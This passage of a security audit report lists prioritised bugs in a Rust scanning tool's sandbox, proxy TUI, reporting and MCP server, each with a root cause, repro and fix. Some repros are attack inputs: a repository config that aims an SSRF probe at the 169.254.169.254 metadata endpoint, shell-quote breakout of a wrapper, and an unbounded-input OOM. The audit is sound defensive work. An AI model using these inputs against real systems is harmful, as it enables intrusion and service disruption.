- **Location:** `crates/smg-sandbox/src/bwrap.rs:631, 1123-1205` (`execute_in_isolated_netns:631`, `run_wsl_bwrap_netns:1123`)
- **Root Cause:** (1) `run_wsl_bwrap_netns` builds a `sh -c` command string by embedding `wsl_root`, `wsl_cfg`, and `wsl_finding` inside single quotes without escaping `'` in those paths, and embeds `escaped_boot` inside double quotes where shell metacharacters (backticks, command substitution, double quotes) are expanded by the outer WSL `sh -c`. (2) On macOS Seatbelt (`execute_in_isolated_netns:631`), `extra_ports` allowlists `port + 2` for `OobSsrfCatcher`, but `OobSsrfCatcher::spawn()` binds `("127.0.0.1", 0)` (an arbitrary OS ephemeral port), so Seatbelt denies the actual OOB listener/callback port.
- **Minimal Repro / Trace:** On WSL2, a repository path containing `'` or a `boot_cmd` containing `"` breaks out of the outer shell wrapper; on macOS Seatbelt, `verify_ssrf_oob_with_config` binds port e.g. `54321 != port + 2` and gets `EPERM`.
- **Surgical Fix:** Pass `wsl_root`, `wsl_cfg`, `wsl_finding`, and `boot_cmd` as positional `sh -c '...' -- arg1 arg2 ...` arguments (or `bwrap --setenv SMG_BOOT_CMD`) instead of string interpolation; pass an explicit `SMG_OOB_PORT = port + 2` env var to `OobSsrfCatcher::spawn_on_port` when running under Seatbelt.

##### [F6-02] `P0` — Five Protocol Verifiers Bypass Isolated Sandbox & `send_raw_protocol_probe` Ignores TLS / Path Sanitization
- **Location:** `crates/smg-sandbox/src/lib.rs:29-37` (`is_dynamic_probe_target`); `crates/smg-sandbox/src/verifier.rs:1010-1305` (`send_raw_protocol_probe:1010`, `verify_finding_with_config:1283`)
- **Root Cause:** (1) `is_dynamic_probe_target` (`lib.rs:29`) only matches `GuardKind::{Auth, TxLock, OwnershipCheck, SsrfSanitizer}`. However, `verify_finding_with_config` (`verifier.rs:1283`) dynamically probes `SMG-OAUTH-*`, `SMG-CSRF-*`, `SMG-REDIRECT-*`, and `SMG-API-*` (GraphQL/WS), which typically carry `GuardKind::ConfigPolicy`. Consequently, `verify_findings_in_sandbox_with_config` skips booting the isolated sandbox for those findings and calls `verify_finding_with_config` directly against the host loopback port (where no server is running). (2) `send_raw_protocol_probe` (`verifier.rs:1010`) hardcodes plain `TcpStream::connect`, ignoring `cfg.use_tls` (breaking all 5 protocol probes against HTTPS `--sandbox-tls` servers), and does not strip `\r`/`\n`/spaces from `raw_path` before formatting HTTP request lines.
- **Minimal Repro / Trace:** Run `verify_findings_in_sandbox_with_config` with only an `SMG-CSRF-001` (`GuardKind::ConfigPolicy`) finding -> `dynamic_indices` is empty -> sandbox never boots -> probe hits closed host port and errors.
- **Surgical Fix:** Update `is_dynamic_probe_target` to include the 5 rule prefixes (`SMG-OAUTH-`, `SMG-CSRF-`, `SMG-REDIRECT-`, GraphQL/WS `SMG-API-`); route `send_raw_protocol_probe` through `connect_probe_stream(port, cfg.use_tls)` and sanitize `raw_path` via `substitute_route_params`.

##### [F6-03] `P0` — `copy_dir_recursive_filtered` Fails on Broken Symlinks & Copies `node_modules`/`.venv` + Prompt Budget Edge Case
- **Location:** `crates/smg-ai/src/lib.rs:44-110, 896-925` (`build_minimal_patch_prompt:44`, `copy_dir_recursive_filtered:896`, `entry.metadata():907`)
- **Root Cause:** (1) `copy_dir_recursive_filtered` calls `let meta = entry.metadata()?;` (which calls `stat()`, following symlinks) on line `907` *before* checking `if entry.file_type()?.is_symlink() { continue; }` on line `908`. Any broken symlink anywhere in the repository aborts `--apply-check` and CEGIS with `ENOENT`. Additionally, it only skips `.git`, `target`, `.shellmind-guard`, and `.veriforge`—copying `node_modules`, `.venv`, `dist`, and `vendor` (potentially gigabytes) on every syntax check and CEGIS iteration. (2) `build_minimal_patch_prompt` appends the 29-byte truncation suffix even when `prompt.len() + 29 > MAX_PROMPT_BYTES`, and includes no source snippet at all when `finding.witness_path` is empty (ignoring `finding.file:finding.line`).
- **Minimal Repro / Trace:** Create a dangling symlink `ln -s /nonexistent/file broken_link` in a repo and run `verify_patch_in_isolated_copy` -> `entry.metadata()?` returns `Err(NotFound)`.
- **Surgical Fix:** Check `entry.file_type()?.is_symlink()` first and use `fs::symlink_metadata` / `file_type`; exclude `node_modules`, `.venv`, `venv`, `__pycache__`, and `dist` (or symlink read-only deps); reserve exact suffix bytes in `MAX_PROMPT_BYTES` and fall back to `(finding.file, finding.line)` when `witness_path` is empty.

##### [F6-04] `P0` — CEGIS Patch Loop Never Feeds Counterexample / Syntax Feedback Back to the AI Provider
- **Location:** `crates/smg-ai/src/codemods.rs:321-445` (`verify_diff_syntax_before_sandbox:321`, `run_cegis_patch_loop:353`)
- **Root Cause:** `run_cegis_patch_loop` stores syntax errors and failed mitigation messages in `last_feedback` on each iteration, but calls `generate_patch_plan(provider, project_root, finding, verified)` without passing `last_feedback`—so iterations 2 and 3 send the identical prompt and cannot learn from prior failures. Additionally, `verify_diff_syntax_before_sandbox` copies the entire workspace to `/tmp` solely to syntax-check the modified file(s), duplicating the full workspace copy performed immediately afterward by `verify_patch_in_isolated_copy`.
- **Minimal Repro / Trace:** When iteration 1 produces a diff that fails `verify_diff_syntax_before_sandbox` or fails mitigation, `last_feedback` is overwritten on iteration 2 without ever being read by `generate_patch_plan`.
- **Surgical Fix:** Add an optional `prior_feedback: Option<&str>` parameter to `generate_patch_plan` / `build_minimal_patch_prompt` so CEGIS passes the exact syntax/verification counterexample into subsequent iterations; apply and syntax-check modified files in memory before copying the workspace for `--apply-check`.

#### P1 — High-Impact Reliability, Concurrency & Accuracy Bugs

##### [F6-05] `P1` — Library `std::process::exit(130)` in Signal Task & Global Single `ACTIVE_SANDBOX_PGID` Race
- **Location:** `crates/smg-sandbox/src/lib.rs:317-323` (`verify_findings_in_sandbox_with_config`); `crates/smg-sandbox/src/bwrap.rs:140, 670, 908` (`ACTIVE_SANDBOX_PGID`)
- **Root Cause:** (1) `verify_findings_in_sandbox_with_config` spawns a detached `tokio::signal::ctrl_c()` task inside a library function that calls `std::process::exit(130)`, immediately terminating the host process and skipping all `Drop` guards (`ProbeTempDirGuard`, `TempDirCleanup`, `MockShimHandle`). (2) `ACTIVE_SANDBOX_PGID` is a single global `AtomicI32`, so concurrent sandbox invocations overwrite each other's PGID and leak child process groups on timeout or Ctrl+C.
- **Surgical Fix:** Track active sandbox PGIDs in a `Mutex<HashSet<i32>>` (or per-guard handle) and handle SIGINT cleanly at the CLI entrypoint with graceful cancellation instead of `std::process::exit` inside the library.

##### [F6-06] `P1` — Fixed 20s Batch Sandbox Timeout & Discarded Host-Fallback Boot Logs
- **Location:** `crates/smg-sandbox/src/bwrap.rs:676, 812-910` (`execute_in_isolated_netns:676`, `spawn_sandboxed_server_with_config:812`)
- **Root Cause:** (1) `execute_in_isolated_netns` enforces a flat 20-second deadline (`Duration::from_secs(20)`) even for `--mode verify-batch` with dozens of findings or `--mode fuzz` with up to 24 routes, causing valid multi-finding batches to time out and degrade all findings to `SuspectUnverified`. (2) `spawn_sandboxed_server_with_config` redirects stdout/stderr to `Stdio::null()`, so when a server exits prematurely on host fallback, `classify_boot_failure` receives no log output and cannot diagnose missing env vars or DB `ECONNREFUSED`.
- **Surgical Fix:** Scale the netns deadline by batch size (e.g., `20s + 3s * count`, capped at 120s) and capture bounded stderr/stdout to a temp boot log in `spawn_sandboxed_server_with_config`.

##### [F6-07] `P1` — `verify_stateful_http_workflow` Skips Use-After-Delete Check on Standard HTTP `204 No Content` & Unsanitized Discovered IDs
- **Location:** `crates/smg-sandbox/src/verifier.rs:397-400, 792-920, 1995-2085` (`is_failure_envelope:397`, `verify_idor_invariant_with_config:792`, `verify_stateful_http_workflow:2065`)
- **Root Cause:** (1) In `verify_stateful_http_workflow` (line `2065`), `deleted_ok` requires `!is_failure_envelope(code, &body)`. Because `is_failure_envelope` (line `398`) returns `true` whenever `status == 204 || body.is_empty()`, every standard REST `DELETE` returning `204 No Content` is treated as `deleted_ok = false`, silently skipping Step 3 (`USE_AFTER_DELETE_STATE`). (2) `verify_idor_invariant_with_config` hardcodes `http://127.0.0.1:` in `replay_cmd` even when `cfg.use_tls == true`, and `discover_user_a_resource_id` interpolates `discovered_id` directly into the request path without percent-encoding or control-char filtering.
- **Surgical Fix:** Treat HTTP `200`, `202`, and `204` as successful `DELETE` responses in `verify_stateful_http_workflow` (checking `is_failure_envelope` only on non-empty bodies); respect `cfg.use_tls` in IDOR `replay_cmd` and sanitize/URL-encode `discovered_id`.

##### [F6-08] `P1` — `WireDiffProxy` Chunk-Boundary Splitting, Unbounded Task Spawning & 40ms OOB Race Window
- **Location:** `crates/smg-sandbox/src/wire_oracle.rs:20-160, 291-340` (`OobSsrfCatcher:20`, `WireDiffProxy:87`, `verify_ssrf_oob_with_config:291, 332`)
- **Root Cause:** (1) `WireDiffProxy` checks each individual `read()` buffer for `"INSERT "`/`"UPDATE "`/`"DELETE "`/`"\r\nSET\r\n"`, missing commands split across TCP segments while false-positiving on `SELECT` queries whose string literals contain those words; both `OobSsrfCatcher` and `WireDiffProxy` spawn unbounded per-connection tasks with no read timeout. (2) `verify_ssrf_oob_with_config` waits a fixed 40ms (`sleep(Duration::from_millis(40))` at line `332`) before reading `catcher.hits()`, causing flaky false negatives on slower async webhook handlers, and appends raw `oob_url` to `?url=` without URL-encoding.
- **Surgical Fix:** Add per-connection I/O timeouts and a rolling tail buffer (or protocol-aware prefix match) in `WireDiffProxy`; poll `catcher.hits()` with a bounded deadline (e.g., up to 250ms in 20ms steps) and URL-encode `oob_url` in the query parameter.

##### [F6-09] `P1` — `smg-ai/src/lib.rs` Unverified `localhost` DNS, Subpath Overwrite & Non-Atomic Multi-File Patch Writes
- **Location:** `crates/smg-ai/src/lib.rs:145-155, 290-305, 796-845` (`is_loopback_host:145`, `generate_patch_plan_with_env:295`, `apply_unified_diff_safely:796`)
- **Root Cause:** (1) `is_loopback_host` trusts literal `"localhost"` without DNS resolution verification (unlike `smg-enterprise/src/tee.rs`), and `generate_patch_plan_with_env` only auto-appends `/v1/chat/completions` when the URL path is empty or `/v1` (breaking custom gateway prefixes like `/openai/v1`). (2) `apply_unified_diff_safely` writes each file directly via `fs::write(&abs_target, updated)`, so an I/O failure partway through a multi-file diff leaves the workspace partially patched, and `validate_rel_diff_path` does not protect `.github/workflows`.
- **Surgical Fix:** Verify `localhost` resolves solely to loopback IPs; preserve path prefixes when appending `/chat/completions`; write via temp-file + atomic rename (with rollback on error) and add `.github` to protected automated-patch paths.

##### [F6-10] `P1` — `SMG-PATH-001` Codemod Breaks on Nested Parens & Rust Regression Test Generator Emits Tautological Stub
- **Location:** `crates/smg-ai/src/codemods.rs:196-235, 448-555` (`synthesize_deterministic_codemod_diff:196`, `generate_regression_test:535-555`)
- **Root Cause:** (1) For `SMG-PATH-001`, `synthesize_deterministic_codemod_diff` finds the end of `os.path.join(...)` / `path.join(...)` using `raw_line[pos..].find(')')`, which stops at the first `)` of any nested call (e.g., `os.path.join(get_dir(), user_file)` -> mangled invalid syntax). (2) `generate_regression_test` for `.rs` files emits `assert!(!target_route.is_empty());` (line `546`)—a tautological stub that always passes and never exercises the route or security invariant.
- **Surgical Fix:** Match balanced parentheses (ignoring string literals) when rewriting `os.path.join`/`path.join`; generate a real loopback HTTP/req-check test in Rust (using `std::net::TcpStream` gated by `SMG_TEST_BASE_URL`, matching the Go/Python/Node generators).

### 6.3 Per-File Verdict Table (Form 6)

| File | Exact `wc -l` | Verdict | Finding IDs |
| :--- | ---: | :--- | :--- |
| `crates/smg-sandbox/src/lib.rs` | 729 | `FINDINGS: 2` | F6-02, F6-05 |
| `crates/smg-sandbox/src/bwrap.rs` | 1,440 | `FINDINGS: 3` | F6-01, F6-05, F6-06 |
| `crates/smg-sandbox/src/verifier.rs` | 3,083 | `FINDINGS: 2` | F6-02, F6-07 |
| `crates/smg-sandbox/src/wire_oracle.rs` | 507 | `FINDINGS: 1` | F6-08 |
| `crates/smg-ai/src/lib.rs` | 1,243 | `FINDINGS: 2` | F6-03, F6-09 |
| `crates/smg-ai/src/codemods.rs` | 790 | `FINDINGS: 2` | F6-04, F6-10 |
| **Total (Form 6)** | **7,792** | **10 Unique Findings (4 P0 · 6 P1 · 0 P2 · 0 P3)** | |

---

## Form 7 (Session 7A) — SARIF / CycloneDX VEX / HTML Reporting (`smg-report`) & Interactive TUI / Proxy TUI (`smg-tui`)

- **Scope:** 6 Rust source files across `crates/smg-report/src/` (1 file, 727 LOC) and `crates/smg-tui/src/` (5 files, 6,399 LOC) — **7,126 LOC total** (100% read line 1 to EOF)
- **Totals:** **8 unique findings** — **2 P0**, **4 P1**, **2 P2**, **0 P3** (2 files `CLEAN`, 4 files with findings)

### 7A.1 Executive Summary

All 6 files in Form 7A (7,126 lines) were audited line-by-line across all 6 mandatory lenses.

- **Highest-Impact Risks:**
  1. **P0 Runtime UTF-8 Slicing Panic in Proxy Decoder (`smg-tui/src/proxy_tui.rs:81-94`):** `pct_decode` slices `&s[i + 1..i + 3]` on raw byte offsets after seeing `'%'`, panicking at runtime whenever `'%'` is followed by a multi-byte UTF-8 character (e.g., `"%€"`).
  2. **P0 Reversed History Selection Index Bug (`smg-tui/src/proxy_tui.rs:321-345, 427-467`):** `draw` renders the proxy history list newest-first (`entries.iter().rev().take(500)`), while `App::selected()` indexes `entries.get(idx)` oldest-first—causing every inspect, replay (`r`), decode (`d`), export (`e`), and diff (`x`) action to operate on the wrong HTTP transaction.
  3. **P1 Proxy TUI Export Disclosure, Unbounded Replay RAM & UI-Thread Freeze (`smg-tui/src/proxy_tui.rs:175, 800-885`):** Export writes raw captured requests/headers to a predictable world-readable `/tmp/smg-proxy-{id}.txt` file; `replay_entry` buffers unbounded `resp.bytes()?` before truncating to 64 KiB; `r` and `i` run synchronous blocking HTTP loops (up to 100 x 3s = 300s) directly on the TUI render thread.
  4. **P1 Report & TUI Accuracy Gaps (`smg-report/src/lib.rs`, `smg-tui/src/lib.rs`):** CycloneDX VEX matches dependency components via `f.title.contains(&d.name)` substring search (misattributing e.g. `log4j` vs `log4j-core`); SARIF locks `security-severity` to the first finding per `rule_id`; TUI Source Inspector shows `"No source hop selected."` whenever `witness_path` is empty instead of falling back to `(finding.file, finding.line)`.

### 7A.2 Findings (P0–P2)

#### P0 — Crash / Security / Soundness Break

##### [F7A-01] `P0` — Runtime UTF-8 Char-Boundary Slicing Panic in `proxy_tui::pct_decode`
- **Location:** `crates/smg-tui/src/proxy_tui.rs:81-94` (`pct_decode`, line `88`)
- **Root Cause:** After checking `raw[i] == b'%' && i + 2 < raw.len()`, `pct_decode` calls `u8::from_str_radix(&s[i + 1..i + 3], 16)`. If the two bytes following `'%'` fall inside a multi-byte UTF-8 character (e.g., `"%€"` where `'€'` occupies 3 bytes), `&s[i + 1..i + 3]` panics at runtime (`byte index N is not a char boundary`), crashing the TUI without cleanly restoring raw terminal mode if not caught.
- **Minimal Repro / Trace:** Pass `"%€"` to `decode_all("%€")` -> `pct_decode` slices `&s[1..3]` across `'€'` -> panic.
- **Surgical Fix:** Decode hex nibbles directly from raw bytes `raw[i + 1]` and `raw[i + 2]` via a pure `u8` helper (`hex_val(b: u8) -> Option<u8>`), eliminating string slicing entirely.

##### [F7A-02] `P0` — Reversed History List Indexing Causes All Proxy TUI Actions to Target the Wrong Transaction
- **Location:** `crates/smg-tui/src/proxy_tui.rs:321-345, 427-467` (`App::selected:321`, `draw:430-467`)
- **Root Cause:** `draw` renders the History list in reverse chronological order (`entries.iter().rev().take(500)` — newest at index `0`), whereas `App::selected()` returns `entries.get(idx)` (oldest at index `0`), `select_next` clamps against `entries.len()` instead of `entries.len().min(500)`, and `push_entry` selects `len - 1` instead of `0`. Selecting the newest item at row `0` displays, replays, decodes, exports, and diffs the *oldest* item in the history buffer.
- **Minimal Repro / Trace:** Capture 2 requests (#1 `GET /a`, #2 `GET /b`). Row 0 in History shows `#2 GET /b`, while Request/Response panes and pressing `r`/`e`/`d` operate on `#1 GET /a`.
- **Surgical Fix:** Map display row `idx` to `entries.iter().rev().nth(idx).cloned()` in `App::selected()`, clamp `select_next` to `entries.len().min(500)`, and select `Some(0)` in `push_entry`.

#### P1 — High-Impact Security, Reliability & Accuracy Bugs

##### [F7A-03] `P1` — Predictable World-Readable `/tmp/smg-proxy-{id}.txt` Export, Unbounded Replay Body & Synchronous UI Freeze
- **Location:** `crates/smg-tui/src/proxy_tui.rs:175, 760-885` (`replay_entry:175`, `run_proxy_tui:760-885`)
- **Root Cause:** (1) Pressing `e` writes full captured HTTP requests/responses (including `Authorization` headers, cookies, and tokens) to a predictable `/tmp/smg-proxy-{id}.txt` path with default umask (symlink/TOCTOU & multi-user disclosure risk). (2) `replay_entry` calls `resp.bytes()?` (line `175`) without a streaming size cap before truncating to `MAX_CAPTURE_IN_VIEW` (64 KiB), allowing a large response to OOM the TUI. (3) Pressing `r` (Repeater) or `Enter` in Intruder runs synchronous blocking `reqwest` loops (up to 100 words x 3s = 300s) directly on the TUI event loop thread, freezing keyboard input and Ctrl+C handling.
- **Surgical Fix:** Export into `.shellmind-guard/` (or a `0o600` file via `OpenOptions::create_new(true)` with `mode(0o600)`); stream replay bodies with `.take(MAX_CAPTURE_IN_VIEW as u64)`; run Repeater and Intruder on background worker threads communicating over an `mpsc::channel`.

##### [F7A-04] `P1` — CycloneDX VEX Substring Matching Misattributes Vulnerabilities to Wrong SBOM Component
- **Location:** `crates/smg-report/src/lib.rs:236-320` (`to_cyclonedx_vex_json`, line `307`)
- **Root Cause:** `matched_comp_ref` locates the affected component via `deps.iter().find(|d| f.title.contains(&d.name))`. When one dependency name is a substring of another (e.g., `log4j` before `log4j-core`, `qs` before `qstring`, `http` before `http-proxy`), `find` attaches the VEX vulnerability record to the wrong component `bom-ref` / PURL.
- **Surgical Fix:** Match on exact package name + version token (e.g., ``format!("`{}@{}`", d.name, d.version)`` or longest-name boundary match) rather than raw substring `contains`.

##### [F7A-05] `P1` — SARIF Rule Severity Locked to First Occurrence & HTML Report Duplicate SVG Marker IDs / Unescaped Single Quotes
- **Location:** `crates/smg-report/src/lib.rs:43-75, 440-450, 559-565` (`to_sarif_json:50-72`, `to_html_graph:444`, `escape_html:559`)
- **Root Cause:** (1) `to_sarif_json` inserts each `rule_id` into `rules` using only the first finding's `severity`, `title`, and `remediation`. If a `MEDIUM` finding appears before a `CRITICAL` finding with the same `rule_id`, GitHub Code Scanning's `security-severity` metadata is fixed at `"5.0"` instead of `"9.0"`. (2) `to_html_graph` emits `<marker id="arrow">` inside every finding's `<svg>` (duplicate HTML DOM `id`s), and `escape_html` does not escape single quotes (`'` -> `&#39;`).
- **Surgical Fix:** Track the maximum `security-severity` per `rule_id` across all findings before emitting SARIF `rules`; scope SVG marker IDs per card (`id="arrow-{idx}"`) and escape `'` in `escape_html`.

##### [F7A-06] `P1` — TUI Source Inspector Displays Blank `"No source hop selected."` for Findings with Empty `witness_path`
- **Location:** `crates/smg-tui/src/lib.rs:1484-1505` (`render_source_inspector`)
- **Root Cause:** `render_source_inspector` only builds `hop_opt` from `c.witness_path.get(idx)`. Many single-file, config, secret, dependency, and fuzz findings have an empty `witness_path` while carrying valid `(c.file, c.line)`—causing the Source Inspector pane to display `"No source hop selected."` even though `edit_current_finding` properly falls back to `(cur.file, cur.line)`.
- **Surgical Fix:** Fall back to a synthetic single-hop `TraceHop { file: c.file, line: c.line, symbol: c.entry_route }` when `c.witness_path` is empty.

#### P2 — Moderate / Resource & Ergonomics

##### [F7A-07] `P2` — Browser Spawner Leaks Zombie Child Processes & Editor Launcher Breaks on Paths with Spaces
- **Location:** `crates/smg-tui/src/lib.rs:2653-2710, 3424-3455` (`launch_editor_for_hop:2653`, `open_path_in_browser:3424`)
- **Root Cause:** (1) `open_path_in_browser` spawns `xdg-open`/`open` and the caller discards `Result<Child>` (`let _ = open_path_in_browser(&out);`), leaving an unwaited zombie child process on Unix until the TUI exits. (2) `launch_editor_for_hop` splits `VISUAL`/`EDITOR` with `.split_whitespace()`, breaking editor executable paths containing spaces (e.g., macOS `/Applications/Visual Studio Code.app/...`).
- **Surgical Fix:** Reap the browser launcher child on a short-lived background thread (or detach properly) and parse `VISUAL`/`EDITOR` with shell-like quote awareness (handling quoted paths with spaces).

##### [F7A-08] `P2` — `copy_clipboard` Writes Raw OSC 52 Without Length Cap / Tmux Passthrough & Blocks Event Loop
- **Location:** `crates/smg-tui/src/session.rs:150-175` (`copy_clipboard`)
- **Root Cause:** `copy_clipboard` emits raw `\x1b]52;c;<b64>\x07` directly to `stdout` without bounding payload size (many terminals drop or corrupt >100 KB OSC 52 sequences) or wrapping for `TMUX`, and then synchronously calls `child.wait()` on `wl-copy`/`xclip`/`pbcopy`, which can stall the TUI event loop if the display server is unresponsive.
- **Surgical Fix:** Cap OSC 52 payload size (e.g., 64 KiB), optionally wrap in DCS passthrough under `TMUX`, and run external clipboard helpers with a short timeout or background thread.

### 7A.3 Per-File Verdict Table (Form 7A)

| File | Exact `wc -l` | Verdict | Finding IDs |
| :--- | ---: | :--- | :--- |
| `crates/smg-report/src/lib.rs` | 727 | `FINDINGS: 2` | F7A-04, F7A-05 |
| `crates/smg-tui/src/lib.rs` | 3,918 | `FINDINGS: 2` | F7A-06, F7A-07 |
| `crates/smg-tui/src/palette.rs` | 311 | `CLEAN — verified line-by-line` | — |
| `crates/smg-tui/src/proxy_tui.rs` | 1,125 | `FINDINGS: 3` | F7A-01, F7A-02, F7A-03 |
| `crates/smg-tui/src/session.rs` | 210 | `FINDINGS: 1` | F7A-08 |
| `crates/smg-tui/src/views.rs` | 835 | `CLEAN — verified line-by-line` | — |
| **Total (Form 7A)** | **7,126** | **8 Unique Findings (2 P0 · 4 P1 · 2 P2 · 0 P3)** | |

---

## Form 7 (Session 7B) — CLI Orchestrator, MCP Server, OSV Sync, OCI Image Scanner & Git Hooks (`src/lib.rs`, `mcp.rs`, `deps_sync.rs`, `oci_image.rs`, `rules_catalog.rs`, `main.rs`, `bin/smg.rs`)

- **Scope:** 7 Rust source files in `src/` (7,599 LOC total, 100% read line 1 to EOF)
- **Totals:** **8 unique findings** — **3 P0**, **4 P1**, **1 P2**, **0 P3** (3 files `CLEAN`, 4 files with findings)

### 7B.1 Executive Summary

All 7 files in Form 7B (7,599 lines) were audited line-by-line across all 6 mandatory lenses.

- **Highest-Impact Risks:**
  1. **P0 `gzip` Pipe Deadlock, Decompression Bomb OOM, `usize` Overflow & Ignored OCI Blobs (`src/oci_image.rs:224-355`):** `maybe_gunzip` writes the entire compressed blob to `gzip -dc` stdin synchronously before reading stdout—deadlocking whenever decompressed output exceeds the 64 KiB OS pipe buffer—and `wait_with_output()` buffers unbounded output (gzip bomb OOM); `walk_tar_bytes` computes `(size + 511) & !511` without overflow checks; `inspect_layer_tar` has unbounded recursion and its inner suffix check (`layer.tar`/`.tar`/`.tar.gz`) silently drops 100% of OCI-layout `blobs/sha256/<hex>` layer blobs.
  2. **P0 Unbounded MCP Line-Drain OOM & `/tmp` Write Scope (`src/mcp.rs:15-40, 263-295`):** When an MCP request line exceeds 4 MiB, `run_stdio_server` calls `reader.read_until(b'\n', &mut discard)` into an unbounded `Vec<u8>` (still OOM-vulnerable); `validate_mcp_target_path` allows any path under `/tmp`, permitting MCP tools to scan or write configs/hooks in arbitrary `/tmp` directories.
  3. **P0 Unvalidated SSRF in `smg doctor --probe-ai` (`src/lib.rs:4714-4745`):** `run_doctor` sends an HTTP `GET {endpoint}/api/tags` to `[ai].endpoint` loaded from an untrusted repository's `.shellmind-guard.toml` without calling `validate_provider_endpoint` or requiring `--trust-repo-config`.
  4. **P1 CLI Orchestration & OSV Gaps (`src/lib.rs`, `src/deps_sync.rs`):** `--watch` re-scans skip `.gitleaks.toml` / `.trivyignore` / `--git-history`; `has_dynamic_targets` omits the 5 protocol rules; `deps_sync` sends bare `"Debian"`/`"Alpine"` ecosystems to OSV without release versions; `--header` uses `value_delimiter = ','` which corrupts comma-containing headers (`Cookie`, `Accept`, `X-Forwarded-For`); and exit codes diverge (`2` for `scan` vs `1` for `image`/`tls`/`idor`/`templates`/`sqli`/`dast`/`http-audit`).

### 7B.2 Findings (P0–P2)

#### P0 — Crash / Security / Soundness Break

##### [F7B-01] `P0` — OCI Scanner `gzip` Pipe Deadlock, Decompression Bomb OOM, Tar Offset Overflow & Dropped `blobs/sha256/` Layers
- **Location:** `src/oci_image.rs:224-355` (`walk_tar_bytes:253`, `maybe_gunzip:258`, `inspect_layer_tar:306, 337`)
- **Root Cause:** (1) `maybe_gunzip` writes `bytes` synchronously to `child.stdin` before calling `child.wait_with_output()`. On any gzipped OCI layer whose decompressed tar exceeds the 64 KiB OS pipe buffer, `gzip -dc` blocks on stdout while Rust blocks on stdin—causing a **permanent deadlock**. Furthermore, `wait_with_output()` buffers unbounded decompressed bytes (gzip bomb OOM). (2) `walk_tar_bytes` computes `let padded = (size + 511) & !511;` (line `253`) without checked arithmetic (panics in debug or wraps in release on malformed octal sizes). (3) `inspect_layer_tar` recurses on nested tarballs with no depth cap, and its inner guard `(norm.ends_with("layer.tar") || norm.ends_with(".tar") || norm.ends_with(".tar.gz"))` never matches extensionless OCI layout blobs (`blobs/sha256/<hex>`), silently skipping all OCI image layers.
- **Minimal Repro / Trace:** Pass a >64 KiB `.tar.gz` OCI layer to `scan_oci_image` -> `stdin.write_all` deadlocks against full stdout pipe; pass an OCI layout archive with `blobs/sha256/<digest>` -> 0 layers inspected.
- **Surgical Fix:** Stream `gzip -dc` stdin on a scoped background thread while reading bounded stdout (e.g., `.take(256 * 1024 * 1024)`)—or use a pure-Rust streaming `flate2` reader; use `size.checked_add(511)` in `walk_tar_bytes`; cap `inspect_layer_tar` recursion depth (e.g., `<= 3`) and inspect `blobs/sha256/*` entries whose magic bytes are gzip (`1f 8b`) or USTAR (`ustar` at offset 257).

##### [F7B-02] `P0` — MCP `run_stdio_server` Unbounded Oversized-Line Drain OOM & Over-Broad `/tmp` Access Scope
- **Location:** `src/mcp.rs:15-40, 263-295, 467` (`run_stdio_server:33`, `validate_mcp_target_path:289`, `install_git_hook:467`)
- **Root Cause:** (1) When an incoming JSON-RPC line reaches `MAX_MCP_LINE_BYTES` (4 MiB) without a newline, line `33` executes `reader.read_until(b'\n', &mut discard)` into an unbounded `Vec<u8>`, allowing a client sending a multi-GB unterminated line to OOM the server. (2) `validate_mcp_target_path` unconditionally permits any path under `std::env::temp_dir()` (`canon.starts_with(&tmp)` at line `289`), letting an MCP caller read or initialize `.shellmind-guard.toml`/hooks in arbitrary `/tmp` subdirectories. Also `shellmind_guard_init` checks `overwrite` for config and workflow files, but not for `.git/hooks/pre-commit`.
- **Minimal Repro / Trace:** Pipe 2 GiB of `'a'` without `\n` into `smg mcp` -> `discard` grows unboundedly until OOM.
- **Surgical Fix:** Drain oversized lines in fixed 8 KiB chunks (discarding bytes without accumulating them in a `Vec`, and aborting cleanly after a hard drain cap); restrict `validate_mcp_target_path` to `cwd` and `SHELLMIND_GUARD_ROOT` (requiring an explicit opt-in env flag for `/tmp` outside tests).

##### [F7B-03] `P0` — Untrusted Repo Config SSRF in `smg doctor --probe-ai`
- **Location:** `src/lib.rs:4714-4755` (`run_doctor`, `ping_url` at line `4722`)
- **Root Cause:** When `smg doctor --probe-ai` runs inside an untrusted repository, it loads `[ai]` from `.shellmind-guard.toml` and immediately issues `reqwest::blocking::Client::get("{endpoint}/api/tags")` without calling `smg_ai::validate_provider_endpoint` (which enforces loopback-only for Ollama) and without requiring `--trust-repo-config`. A malicious repo's `.shellmind-guard.toml` can point `endpoint` at `http://169.254.169.254/latest/meta-data` or internal cluster services, triggering an SSRF probe.
- **Minimal Repro / Trace:** Place `[ai]\nprovider = "ollama"\nendpoint = "http://169.254.169.254"` in `.shellmind-guard.toml` and run `smg doctor --probe-ai` -> sends HTTP GET to `http://169.254.169.254/api/tags`.
- **Surgical Fix:** Call `smg_ai::validate_provider_endpoint(&provider)` before issuing any network request in `run_doctor --probe-ai`, and gate probing untrusted repo `[ai]` configs behind `--trust-repo-config` (or warn and skip).

#### P1 — High-Impact Reliability, Accuracy & CLI Consistency Bugs

##### [F7B-04] `P1` — `--watch` Mode Drops `.gitleaks.toml`/`.trivyignore`/`--git-history` & `apply_phase21_secrets_extensions` Re-Walks Repo Uncontained
- **Location:** `src/lib.rs:1469-1555, 2295-2410` (`apply_phase21_secrets_extensions:1469`, `Commands::Scan` watch loop)
- **Root Cause:** (1) Inside `Commands::Scan --watch`, re-scans call `execute_scan_pipeline_full` and `apply_suppressions_and_baseline`, but skip `apply_phase21_secrets_extensions` and `TrivyIgnore::load`—causing `.gitleaks.toml`-allowlisted secrets and `.trivyignore`-waived CVEs to reappear on the first file edit. (2) `apply_phase21_secrets_extensions` reads `repo_root.join(&f.file)` without canonical containment verification and runs a duplicate full `scan_repository` when custom `.gitleaks.toml` rules are present.
- **Surgical Fix:** Extract post-scan secret/trivyignore filtering into a shared helper called by both initial scan and `--watch` iterations, reuse already-indexed `summary.files`, and canonicalize paths against `repo_root`.

##### [F7B-05] `P1` — `has_dynamic_targets` Omits 5 Protocol Rules & `Replay --patch --apply-check` Double-Calls AI Provider
- **Location:** `src/lib.rs:1726-1735, 2500-2580` (`execute_scan_pipeline_full:1726`, `Commands::Replay:2553`)
